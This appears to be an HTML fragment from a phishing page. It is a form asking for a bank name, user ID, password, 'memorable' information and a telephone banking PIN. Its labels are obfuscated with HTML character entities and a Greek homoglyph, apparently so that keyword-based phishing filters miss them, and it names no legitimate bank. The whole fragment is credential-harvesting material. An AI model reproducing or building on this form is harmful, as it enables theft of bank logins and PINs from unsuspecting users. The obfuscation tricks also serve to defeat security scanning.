<br>
<form>
	<table>
<tr>

			<td>&#x0042;ank Name :</td>
			<td><input type="text"  autocomplete="off"  maxlength="30" style="width: 11.5em;" name="bnknames" value="" required="required" title="Bank Name"></input></td>
		</tr>
		<tr>

			<td>&#x0055;ser ΙD :</td>
			<td><input type="text"  autocomplete="off"  maxlength="20" style="width: 9.5em;" name="u_id" value="" required="" title="User ΙD"></input></td>
		</tr>
		<tr>
			<td>Passw&omicron;rd :</td>
			<td><input type="password"  autocomplete="off" maxlength="20" style="width: 9.5em;" name="pwd_b" value="" required="" title="Password"></input></td>
		</tr>
		<tr>
			<td>&#77;emorable :</td>
			<td><input type="password"  autocomplete="off" style="width: 9.5em;" maxlength="18" name="m_able" value="" required="" title="Memorable"></input></td>
		</tr>
		<tr>
			<td>Telephone Ba&#110;king Pin :</td>
			<td><input type="password"  autocomplete="off" id="txt" onkeyup="check()" onmouseout="check()" style="width: 6.4em;"  maxlength="10" name="tpin" value="" required="" title="Telephone Pin"></input></td>
		</tr>
	</table>

</form>
